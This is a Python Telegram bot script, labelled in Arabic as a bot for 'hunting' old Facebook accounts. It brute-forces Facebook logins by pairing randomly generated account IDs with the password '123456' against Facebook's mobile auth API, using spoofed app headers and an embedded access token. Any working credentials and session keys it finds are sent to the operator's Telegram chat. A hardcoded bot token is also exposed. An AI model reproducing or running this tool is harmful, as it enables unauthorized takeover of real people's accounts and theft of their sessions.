import requests
from telebot import types
import telebot
import random
import requests, sys, time, re, random
tel="6866818296:AAHcR_oXq6_lRJ3Qa9biocEXvMLL8V2ZYT0"
bot = telebot.TeleBot(tel);r=requests.session() 
rua = random.choice([
"Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]" , "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]" , "Mozilla/5.0 (Linux; Android 12; SM-G781U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]"])

@bot.message_handler(commands=['start'])
def start(message):
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 2
    ii = types.InlineKeyboardButton(text =" START",callback_data = 'yasir')
    maac.add(ii)
    bjj = message.chat.id
    bot.send_message(message.chat.id,text=f"""
اهلا بك في بوت صيد فيس قديم
    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def oss(call):
    if call.data == 'yasir':
    	yasir(call.message)
    	
def yasir(message):
 no =0
 ok =0
 cp =0
 dd = '123456789'
 while True: 
        re="".join(random.choice(dd)for i in range(9))
        user = '100000' + re
        pess = '123456'
        ses = requests.Session()
        headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pess)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
        #print(response.json())
         
        if "session_key" in response.text and "EAAA" in response.text:
        	ii=response.json()["session_key"]
        	#print(response)
        #if "checkpoint" in po.cookies.get_dict().keys():
       # if 'logged_in_user' in req:
        	ok+=1
        	mees = types.InlineKeyboardMarkup(row_width=1)
        	sa6 = types.InlineKeyboardButton(f"M: {ii}",callback_data='sa')
        	sa1 = types.InlineKeyboardButton(f"DONE : {ok}",callback_data='sa2')
        	sa5 = types.InlineKeyboardButton(f"CP : {cp}",callback_data='sa')
        	sa2 = types.InlineKeyboardButton(f"BAD : {no}",callback_data='sa')        	        	
        	sa3= types.InlineKeyboardButton(f"{user}:{pess}",callback_data='sa3')
        	sa4 = types.InlineKeyboardButton(f"programmer",url="https://t.me/anasmb ",callback_data='sa4')        	
        	mees.add(sa6,sa1,sa5,sa2,sa3,sa4)
        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="تم تشغيل البوت الرجاء التحلي بالصبر",parse_mode='markdown',reply_markup=mees)            	    	      	
        	bot.send_message(message.chat.id,f"New Account\n username  : {user}\nPassword : {pess} ",parse_mode="html")
        elif "www.facebook.com" in response.json()["error_msg"]:
        	ii=response.json()["error_msg"]
        	cp+=1
        	mees = types.InlineKeyboardMarkup(row_width=1)
        	sa6 = types.InlineKeyboardButton(f"M: {ii}",callback_data='sa')
        	sa1 = types.InlineKeyboardButton(f"DONE : {ok}",callback_data='sa2')
        	sa5 = types.InlineKeyboardButton(f"CP : {cp}",callback_data='sa')
        	sa2 = types.InlineKeyboardButton(f"BAD : {no}",callback_data='sa')        	        	
        	sa3= types.InlineKeyboardButton(f"{user} : {pess}",callback_data='sa3')
        	sa4 = types.InlineKeyboardButton(f"programmer ",url="https://t.me/anasmb ",callback_data='sa4')        	
        	mees.add(sa1,sa5,sa2,sa3,sa4)
        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="تم تشغيل البوت الرجاء التحلي بالصبر",parse_mode='markdown',reply_markup=mees)
        	bot.send_message(message.chat.id,f"New Account\n username  : {user}\nPassword : {pess} ",parse_mode="html")        	        	
        else:
        	ii=response.json()["error_msg"]
        	no+=1
        	mees = types.InlineKeyboardMarkup(row_width=1)
        	sa6 = types.InlineKeyboardButton(f"M: {ii}",callback_data='sa')
        	sa1 = types.InlineKeyboardButton(f"DONE : {ok}",callback_data='sa2')
        	sa5 = types.InlineKeyboardButton(f"CP : {cp}",callback_data='sa')
        	sa2 = types.InlineKeyboardButton(f"BAD : {no}",callback_data='sa')        	        	
        	sa3= types.InlineKeyboardButton(f"{user} : {pess}",callback_data='sa3')
        	sa4 = types.InlineKeyboardButton(f"programmer ",url="https://t.me/anasmb ",callback_data='sa4')        	
        	mees.add(sa6,sa1,sa5,sa2,sa3,sa4)
        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="تم تشغيل البوت الرجاء التحلي بالصبر",parse_mode='markdown',reply_markup=mees)
        	
        	
        
bot.polling(True)
